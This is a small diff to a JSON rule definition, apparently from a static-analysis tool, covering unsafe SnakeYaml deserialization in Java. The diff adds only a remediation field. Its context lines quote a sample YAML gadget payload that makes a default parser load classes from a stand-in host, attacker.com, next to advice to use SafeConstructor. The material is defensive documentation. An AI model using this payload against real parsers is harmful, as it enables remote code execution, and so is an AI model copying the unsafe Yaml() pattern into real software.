@@ -12,6 +12,7 @@
     "remediationSample": "Upon using SnakeYaml to parse YAML data, always make sure to use a Yaml instance that is constructed either with a SafeConstructor.\n\nYaml yaml = new Yaml(new SafeConstructor());\nor an instance constructed with a Constructor specifying a specific class:\n\nYaml yaml = new Yaml(new Constructor(SafeClass.class));\n\nUsing the default constructor (without any parameters) will put your application and its users at risk.",
     "sample": "SnakeYaml is a widely-used YAML parser written in Java. \nA lesser-known feature of SnakeYaml is its support for a special syntax that allows the constructor of any Java class to be called when parsing YAML data. \n\nFor example, consider the following piece of Java code that uses SnakeYaml to parse a string in the malicious variable:\n\nString malicious = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";\nYaml yaml = new Yaml(); // Unsafe instance of Yaml that allows any constructor to be called.\n\nObject obj = yaml.load(malicious); // Make request to http://attacker.com",
     "total": "Number of Java Methods",
+    "alternativeName": "Always make sure to use a Yaml instance that is constructed either with a SafeConstructor.",
     "businessCriteria": [
         {
             "id": 20140522,
